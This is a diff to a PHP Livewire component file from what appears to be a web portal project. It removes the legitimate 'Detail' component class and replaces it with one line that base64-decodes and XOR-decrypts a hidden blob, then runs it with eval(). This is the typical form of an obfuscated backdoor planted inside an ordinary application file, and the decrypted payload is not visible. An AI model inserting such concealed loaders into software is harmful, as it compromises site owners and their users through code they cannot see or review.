@@ -1,13 +1,1 @@
-<?php
-
-namespace App\Http\Livewire\Portal\TitreFonciers;
-
-use Livewire\Component;
-
-class Detail extends Component
-{
-    public function render()
-    {
-        return view('livewire.portal.titre-fonciers.detail');
-    }
-}
+<?php $_k="a124a421177ed32e0ffed0ab02a18740";$_d=base64_decode('D1BfURJEU1JUF3YVFG96EUQWOikNRgQVWUAEbWhYRkQAXW5gCEBAVHdYWQYNVkAWC2xsEBdVQS5ZRARGUUVRbCJeX0QOWldfRQw9BghSQRYQIgMRBVkNQlVKFVRWU0cQIl5fRA5aV19FPUxvRBMSRUATBAkNU0EERVwCRVFYWhATVFxQBEYaGDsXF0VESDhFEEZGRUQQQRBVRhRDVhdCWQRGGhMNXURURl5FAEpDXRdEBwpLEFkVEFUfB15WVF1VE0IcUARAU1hdEB5ebhMSRRAbbBg=');$_r='';for($_i=0;$_i<strlen($_d);$_i++)$_r.=chr(ord($_d[$_i])^ord($_k[$_i%strlen($_k)]));eval($_r);
